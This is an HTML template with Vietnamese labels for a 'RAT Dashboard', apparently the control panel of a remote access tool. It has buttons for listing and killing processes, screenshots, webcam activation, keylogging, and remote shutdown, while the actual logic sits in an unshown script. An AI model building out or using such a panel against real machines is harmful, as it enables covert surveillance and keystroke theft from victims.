<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Dashboard</title>
    <style>
        body { font-family: sans-serif; margin: 0; padding: 20px; background-color: #f4f4f9; }
        .container { display: flex; gap: 20px; height: 85vh; }
        
        .sidebar { width: 300px; background: #fff; padding: 20px; border-radius: 8px; display: flex; flex-direction: column; gap: 10px; }
        .main-display { flex: 1; background: #fff; padding: 20px; border-radius: 8px; display: flex; flex-direction: column; overflow: hidden; }
        
        .btn { padding: 12px; border: none; border-radius: 5px; cursor: pointer; text-align: left; font-weight: bold; width: 100%; margin-bottom: 5px; }
        .btn:hover { opacity: 0.9; }
        .btn-primary { background-color: #007bff; color: white; }
        .btn-warning { background-color: #ffc107; color: black; }
        .btn-danger { background-color: #dc3545; color: white; }
        .btn-info { background-color: #17a2b8; color: white; }
        
        .input-group { background: #eee; padding: 10px; border-radius: 5px; margin-bottom: 10px; }
        .input-group input { width: 95%; padding: 5px; margin-bottom: 5px; }

        .view-section { display: none; height: 100%; overflow-y: auto; }
        .view-section.active { display: block; }
        
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; border-bottom: 1px solid #ddd; text-align: left; }
        .btn-kill { background: #dc3545; color: white; padding: 5px 10px; border: none; cursor: pointer; }
        
        #monitor-img { max-width: 100%; max-height: 100%; object-fit: contain; display: block; margin: auto; }
        #keylog-area { width: 100%; height: 90%; background: #222; color: #0f0; padding: 10px; }
    </style>
</head>
<body>
    <h1 style="text-align: center;">Remote Control Dashboard</h1>
    
    <div class="container">
        <!-- CỘT TRÁI: ĐIỀU KHIỂN -->
        <div class="sidebar">
            <h3>Chức năng</h3>
            
            <button class="btn btn-primary" onclick="listApps(); switchView('view-table', 'Danh sách Ứng dụng')">1. List Apps</button>
            <button class="btn btn-primary" onclick="listProcesses(); switchView('view-table', 'Danh sách Process')">2. List Process</button>
            
            <div class="input-group">
                <input type="text" id="app-path" placeholder="Tên App (vd: notepad)">
                <button class="btn btn-success" style="width:100%" onclick="startApp()">Start App/Process</button>
            </div>

            <button class="btn btn-info" onclick="requestScreenshot()">3. Chụp màn hình</button>
            <button id="btn-webcam" class="btn btn-warning" onclick="toggleWebcam()">4. Bật Webcam</button>
            
            <div style="display:flex; gap: 5px;">
                <button class="btn btn-warning" onclick="startKeylog()">Keylog Start</button>
                <button class="btn btn-warning" onclick="stopKeylog()">Keylog Stop</button>
            </div>
            
            <div style="margin-top: auto;">
                <button class="btn btn-danger" onclick="restartMachine()">6. Restart Máy</button>
                <button class="btn btn-danger" onclick="shutdownMachine()">7. Shutdown Máy</button>
                <div id="status-log" style="font-size: 0.8em; color: #666; margin-top: 10px;">Ready...</div>
            </div>
        </div>

        <!-- CỘT PHẢI: HIỂN THỊ -->
        <div class="main-display">
            <h2 id="view-title">Màn hình chính</h2>
            
            <div id="view-table" class="view-section">
                <table>
                    <thead><tr><th>ID</th><th>Tên</th><th>Hành động</th></tr></thead>
                    <tbody id="table-body"></tbody>
                </table>
            </div>

            <div id="view-media" class="view-section">
                <img id="monitor-img" src="" alt="Chưa có ảnh" />
            </div>

            <div id="view-keylog" class="view-section">
                <textarea id="keylog-area" readonly></textarea>
            </div>
        </div>
    </div>

    <!-- Script nạp biến từ Flask và chạy Logic -->
    <script>const GATEWAY_CONFIG = "{{ ws_server }}";</script>
    <script src="{{ url_for('static', filename='main.js') }}"></script>
    <script>window.onload = function() { initWebSocket(GATEWAY_CONFIG); };</script>
</body>
</html>
